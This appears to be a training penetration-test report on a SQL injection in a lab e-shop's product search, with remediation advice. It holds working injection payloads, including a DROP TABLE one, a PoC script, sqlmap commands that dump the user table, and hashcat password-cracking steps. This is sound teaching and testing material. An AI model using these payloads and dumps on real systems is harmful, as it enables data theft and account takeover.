# SQL Injection Vulnerability - Complete Penetration Testing Report

## Vulnerability Overview
**Type**: SQL Injection  
**Severity**: CRITICAL (CVSS 3.1: 9.8)  
**CWE ID**: CWE-89 - Improper Neutralization of Special Elements used in an SQL Command  
**OWASP Category**: A03:2021 – Injection  
**Location**: Product Search Functionality (`/catalog/?q=`)  
**Affected Component**: `eshop/views.py` - `catalog_view` function (lines 361-410)  

## Executive Summary

During our penetration testing engagement of the E-Shop web application, we discovered a critical SQL injection vulnerability in the product search functionality. This vulnerability allows attackers to execute arbitrary SQL commands, potentially leading to complete database compromise, data exfiltration, and authentication bypass. The vulnerability exists due to unsafe string concatenation in SQL query construction, where user input is directly embedded into SQL statements without proper sanitization or parameterization.

## Discovery Process - The Penetration Testing Story

### Phase 1: Initial Reconnaissance

Our testing began with standard reconnaissance of the e-commerce application. After setting up our testing environment:

```bash
# Testing Environment Setup
Host OS: macOS (10.211.55.2)
Kali VM: 10.211.55.4
Target: http://10.211.55.2:8000
```

We first needed to authenticate to access the catalog functionality:
- Username: `admin`
- Password: `admin123`

### Phase 2: Application Mapping

After authentication, we mapped the application's functionality:

```
GET /                    # Redirects to /login/ if not authenticated
GET /login/              # Login page
POST /login/             # Authentication endpoint
GET /catalog/            # Product catalog with search (requires auth)
GET /product/<uuid>/     # Product details
POST /add-to-cart/       # Add products to cart
GET /payment/            # Checkout process
```

**[SCREENSHOT - Login Page]**
From Kali VM:
```bash
# Take screenshot of login page
firefox http://10.211.55.2:8000/login/
# Show the login form with username/password fields
```

**[SCREENSHOT - Authenticated Catalog Page]**
```bash
# After login, capture the catalog page
firefox http://10.211.55.2:8000/catalog/
# Show the product listing and search box
```

The search functionality caught our attention:
- URL Pattern: `/catalog/?q=<search_term>`
- Method: GET
- Parameter: `q` (search query)

**[SCREENSHOT - Search Functionality]**
```bash
# Normal search behavior
firefox "http://10.211.55.2:8000/catalog/?q=laptop"
# Screenshot showing filtered results for "laptop"
```

### Phase 3: Manual Testing for SQL Injection

#### Test 1: Basic Error Detection
We started with simple SQL metacharacters to test for errors:

```bash
# Single quote test
GET /catalog/?q=' HTTP/1.1
Host: 10.211.55.2:8000
Cookie: sessionid=6oj2r541khqshy6mg4o1oxkddjm4fbbj
```

Result: No visible error, but behavior seemed unusual.

**[SCREENSHOT 1 - Initial Testing]**
From Kali VM:
```bash
# Using Firefox to test
firefox http://10.211.55.2:8000/catalog/?q='

# Or using Burp Suite
1. Configure Firefox proxy: 127.0.0.1:8080
2. Browse to http://10.211.55.2:8000/catalog/?q=test
3. Intercept and modify 'q' parameter to single quote
4. Screenshot the response showing unusual behavior
```

#### Test 2: Boolean-Based Detection
Next, we tried boolean logic to detect blind SQL injection:

```bash
# Always true condition
GET /catalog/?q=' OR '1'='1 HTTP/1.1

# Always false condition  
GET /catalog/?q=' AND '1'='2 HTTP/1.1
```

**Breakthrough**: The `' OR '1'='1` payload returned ALL products in the database instead of search results! This confirmed SQL injection vulnerability.

**[SCREENSHOT 2 - SQL Injection Confirmed]**
From Kali VM:
```bash
# Method 1: Browser
firefox "http://10.211.55.2:8000/catalog/?q=' OR '1'='1"
# Screenshot showing ALL products returned

# Method 2: Command line with curl
curl -s -b "sessionid=YOUR_SESSION_ID" \
     "http://10.211.55.2:8000/catalog/?q=%27%20OR%20%271%27%3D%271" \
     | grep -c "product-card"
# Screenshot showing product count

# Method 3: Burp Suite
# Capture the request and show the payload in Repeater
```

### Phase 4: Understanding the Vulnerable Query

Through careful analysis and error-based testing, we deduced the backend query structure:

```sql
SELECT id, name, description, price, created_at, updated_at 
FROM eshop_product 
WHERE name LIKE '%%USER_INPUT%%' 
OR description LIKE '%%USER_INPUT%%'
```

The double percentage signs (`%%`) in the LIKE clause created a unique injection context that required special handling for UNION-based attacks.

### Phase 5: Exploitation - Manual Techniques

#### Extracting All Products
```
Payload: ' OR '1'='1
Effect: Returns all products regardless of search term
```

#### Attempting UNION-Based Injection
Initial UNION attempts failed:
```
' UNION SELECT null,null,null,null,null,null--  # Failed
```

We realized the LIKE wildcards were interfering. After multiple attempts, we discovered that the query expected exactly 6 columns with specific data types:
1. UUID (for product ID)
2. String (name)
3. String (description)  
4. Decimal (price)
5. Datetime (created_at)
6. Datetime (updated_at)

### Phase 6: Automated Exploitation with SQLMap

After confirming the vulnerability manually, we employed SQLMap for comprehensive exploitation:

**[SCREENSHOT - Getting Session Cookie]**
From Kali VM:
```bash
# Method 1: Browser Developer Tools
1. Login to application in Firefox
2. Press F12 for Developer Tools
3. Go to Storage → Cookies
4. Copy sessionid value
# Screenshot showing cookie extraction

# Method 2: Burp Suite
1. Intercept login request
2. Check response headers for Set-Cookie
# Screenshot of Burp showing session cookie
```

#### Initial SQLMap Attempts Failed
```bash
sqlmap -u "http://10.211.55.2:8000/?q=test" \
       --cookie="sessionid=6oj2r541khqshy6mg4o1oxkddjm4fbbj" \
       --batch --risk=3 --level=5
```
Result: SQLMap couldn't automatically detect the injection.

**[SCREENSHOT - SQLMap Initial Failure]**
```bash
# Run from Kali terminal and capture the output
# showing "all tested parameters do not appear to be injectable"
```

#### Successful SQLMap Exploitation
Through trial and error, we found the working command:

```bash
sqlmap -u "http://10.211.55.2:8000/?q=test" \
       --cookie="sessionid=6oj2r541khqshy6mg4o1oxkddjm4fbbj" \
       --batch \
       --threads 8 \
       -T eshop_customuser \
       --dump
```

**[SCREENSHOT - SQLMap Success]**
From Kali VM:
```bash
# Terminal screenshot showing:
# 1. SQLMap banner
# 2. "the back-end DBMS is SQLite"
# 3. "fetching entries for table 'eshop_customuser'"
# 4. The dumped data in table format
```

This successfully dumped the user table, revealing:
- Usernames
- Email addresses
- Weak MD5 password hashes
- Admin status flags
- Account creation dates

**[SCREENSHOT - Dumped User Data]**
```bash
# Close-up screenshot of the dumped table showing:
# | id | username | email | password_hash |
# Focus on the MD5 hashes exposed
```

### Phase 7: Data Exfiltration Results

#### Extracted User Credentials
```
[*] admin, admin@eshop.gr, 0192023a7bbd73250516f069df18b500 (admin123)
[*] test, test@example.com, cc03e747a6afbbcbf8be7668acfebee5 (test123)
[*] john, john@example.com, 5f4dcc3b5aa765d61d8327deb882cf99 (password)
[*] maria, maria@example.com, e10adc3949ba59abbe56e057f20f883e (123456)
[*] george, george@example.com, 9b306ab04ef5e25f9fb89c998a6aedab (george)
```

#### Password Cracking
The weak MD5 hashes were easily cracked using:

**[SCREENSHOT - Hash Cracking with Hashcat]**
From Kali VM:
```bash
# Save hashes to file
echo "0192023a7bbd73250516f069df18b500" > hashes.txt
echo "cc03e747a6afbbcbf8be7668acfebee5" >> hashes.txt
echo "5f4dcc3b5aa765d61d8327deb882cf99" >> hashes.txt

# Run hashcat
hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt
# Screenshot showing cracked passwords

# Alternative: John the Ripper
john --format=raw-md5 hashes.txt
# Screenshot of john output
```

**[SCREENSHOT - Online Hash Lookup]**
```bash
# Using online services (for demo only)
firefox https://crackstation.net/
# Screenshot showing MD5 hash lookup revealing passwords
```

## Technical Deep Dive

### Vulnerable Code Analysis

The vulnerability exists in `/eshop/views.py` at the `catalog_view` function:

```python
# VULNERABLE CODE - Line 367-372
raw_query = f"""
SELECT id, name, description, price, created_at, updated_at 
FROM eshop_product 
WHERE name LIKE '%%{search_query}%%' 
OR description LIKE '%%{search_query}%%'
"""
cursor.execute(raw_query)
```

**Critical Issues**:
1. Direct string concatenation with user input
2. No input sanitization or validation
3. No parameterized queries
4. Raw SQL execution with user-controlled data

### Attack Vectors Discovered

1. **Authentication Bypass**: Could potentially login as any user
2. **Data Exfiltration**: Full database dump possible
3. **Data Manipulation**: UPDATE/DELETE operations possible
4. **Privilege Escalation**: Admin account compromise
5. **Information Disclosure**: Database schema enumeration

### Exploitation Complexity

The LIKE clause with wildcards made exploitation non-trivial:
- Standard UNION payloads failed initially
- Required understanding of the exact query structure
- SQLMap needed specific parameters to work

## Impact Analysis

### Technical Impact
- **Confidentiality**: Complete breach - all data readable
- **Integrity**: Database manipulation possible
- **Availability**: Potential for data deletion/corruption
- **Authentication**: Complete bypass possible

### Business Impact
- **Data Breach**: Customer PII, payment information, order history
- **Financial Loss**: Direct theft, regulatory fines, lawsuits
- **Reputation Damage**: Loss of customer trust
- **Compliance Violations**: GDPR, PCI-DSS violations

### Real-World Attack Scenario
1. Attacker discovers search functionality
2. Tests for SQL injection with `' OR '1'='1`
3. Confirms vulnerability by seeing all products
4. Uses SQLMap to dump entire database
5. Cracks weak MD5 passwords offline
6. Logs in as admin for complete control
7. Exfiltrates customer data for sale on dark web

**[SCREENSHOT - Admin Access Gained]**
From Kali VM:
```bash
# Login as admin with cracked password
1. Firefox http://10.211.55.2:8000/login/
2. Username: admin
3. Password: admin123 (cracked from hash)
# Screenshot showing successful admin login

# Access admin panel
firefox http://10.211.55.2:8000/admin/
# Screenshot showing Django admin interface
```

## Proof of Concept

### Manual Exploitation PoC
```python
import requests

# Setup
session = requests.Session()
base_url = "http://10.211.55.2:8000"

# Login first
login_data = {
    'username': 'test',
    'password': 'test123',
    'csrfmiddlewaretoken': session.cookies.get('csrftoken')
}
session.post(f"{base_url}/login/", data=login_data)

# SQL Injection payloads
payloads = [
    "' OR '1'='1",  # Get all products
    "' OR 1=1--",    # Alternative syntax
    "'; DROP TABLE eshop_product--",  # Destructive (don't run!)
]

for payload in payloads:
    response = session.get(f"{base_url}/catalog/", params={'q': payload})
    print(f"Payload: {payload}")
    print(f"Products found: {response.text.count('product-card')}")
```

### SQLMap Exploitation PoC
```bash
#!/bin/bash
# sql_injection_poc.sh

SESSION_ID="YOUR_SESSION_ID_HERE"
TARGET="http://10.211.55.2:8000/?q=test"

echo "[*] Enumerating databases..."
sqlmap -u "$TARGET" --cookie="sessionid=$SESSION_ID" --batch --dbs

echo "[*] Dumping user table..."
sqlmap -u "$TARGET" --cookie="sessionid=$SESSION_ID" --batch \
       --threads 8 -T eshop_customuser --dump

echo "[*] Extracting order information..."
sqlmap -u "$TARGET" --cookie="sessionid=$SESSION_ID" --batch \
       -T eshop_order --dump
```

## Remediation

### Immediate Fix - Use Parameterized Queries

Replace the vulnerable code with Django ORM:

```python
# SECURE CODE
from django.db.models import Q

def catalog_view(request):
    search_query = request.GET.get('q', '')
    
    if search_query:
        # Safe parameterized query using Django ORM
        products = Product.objects.filter(
            Q(name__icontains=search_query) | 
            Q(description__icontains=search_query)
        )
    else:
        products = Product.objects.all()
```

### Additional Security Measures

1. **Input Validation**
```python
import re

def validate_search_input(query):
    # Allow only alphanumeric, spaces, and basic punctuation
    if not re.match(r'^[a-zA-Z0-9\s\-\.]+$', query):
        raise ValueError("Invalid search query")
    return query
```

2. **Prepared Statements (if raw SQL necessary)**
```python
from django.db import connection

def safe_search(search_term):
    with connection.cursor() as cursor:
        # Using parameterized query
        cursor.execute(
            "SELECT * FROM eshop_product WHERE name LIKE %s OR description LIKE %s",
            [f'%{search_term}%', f'%{search_term}%']
        )
        return cursor.fetchall()
```

3. **Web Application Firewall (WAF) Rules**
```
# ModSecurity rule example
SecRule ARGS:q "@detectSQLi" \
    "id:1001,\
    phase:2,\
    block,\
    msg:'SQL Injection Attack Detected',\
    logdata:'Matched Data: %{MATCHED_VAR} found within %{MATCHED_VAR_NAME}'"
```

4. **Database Security Hardening**
- Use least privilege database user
- Read-only user for SELECT operations
- Separate users for different operations
- Enable SQL query logging

5. **Security Headers**
```python
# Add to Django middleware
response['X-Content-Type-Options'] = 'nosniff'
response['X-Frame-Options'] = 'DENY'
response['Content-Security-Policy'] = "default-src 'self'"
```

## Lessons Learned

1. **Never trust user input** - Always validate and sanitize
2. **Use parameterized queries** - Avoid string concatenation
3. **Defense in depth** - Multiple layers of security
4. **Regular security testing** - Continuous assessment
5. **Security training** - Developer awareness is crucial

## Screenshot Collection Guide from Kali VM

### Essential Screenshots for Documentation

1. **Environment Setup**
```bash
# Screenshot 1: Kali VM network configuration
ip addr show
# Show VM has IP 10.211.55.4

# Screenshot 2: Target accessibility
ping 10.211.55.2
curl -I http://10.211.55.2:8000
```

2. **Initial Access**
```bash
# Screenshot 3: Login page
firefox http://10.211.55.2:8000/login/

# Screenshot 4: Normal catalog behavior
firefox http://10.211.55.2:8000/catalog/?q=laptop
```

3. **SQL Injection Discovery**
```bash
# Screenshot 5: SQL injection test
firefox "http://10.211.55.2:8000/catalog/?q=' OR '1'='1"
# Capture showing ALL products returned

# Screenshot 6: Burp Suite intercept
# Show the modified request in Burp Repeater
```

4. **SQLMap Exploitation**
```bash
# Screenshot 7: SQLMap running
# Terminal showing the command and initial output

# Screenshot 8: SQLMap success
# Show "the back-end DBMS is SQLite" message

# Screenshot 9: Data dump
# Table with usernames and MD5 hashes
```

5. **Post-Exploitation**
```bash
# Screenshot 10: Hash cracking
hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt --show

# Screenshot 11: Admin login
# Using cracked credentials

# Screenshot 12: Admin panel access
firefox http://10.211.55.2:8000/admin/
```

### Burp Suite Configuration for Screenshots
```bash
# Setup Burp Suite on Kali
1. Start Burp Suite
2. Proxy → Options → Add listener: 127.0.0.1:8080
3. Firefox → Preferences → Network Settings
4. Manual proxy: 127.0.0.1:8080
5. Browse to http://burp and install CA certificate

# Key Burp screenshots:
- Intercepted login request
- Modified SQL injection payload
- Response showing vulnerability
```

### Command Line Screenshot Tools
```bash
# Take screenshots from terminal
gnome-screenshot -w -d 5  # Window screenshot with 5 sec delay
scrot -s screenshot.png   # Select area to capture
import screenshot.png     # ImageMagick capture tool

# Record terminal session
script -r session.log     # Start recording
# ... perform actions ...
exit                      # Stop recording
scriptreplay session.log  # Replay for screenshots
```

## References

- [OWASP SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
- [CWE-89: SQL Injection](https://cwe.mitre.org/data/definitions/89.html)
- [SQLMap Documentation](https://sqlmap.org/)
- [Django Security Best Practices](https://docs.djangoproject.com/en/stable/topics/security/)

---

**Disclaimer**: This report was created for educational purposes as part of penetration testing training. All testing was performed in a controlled environment with proper authorization.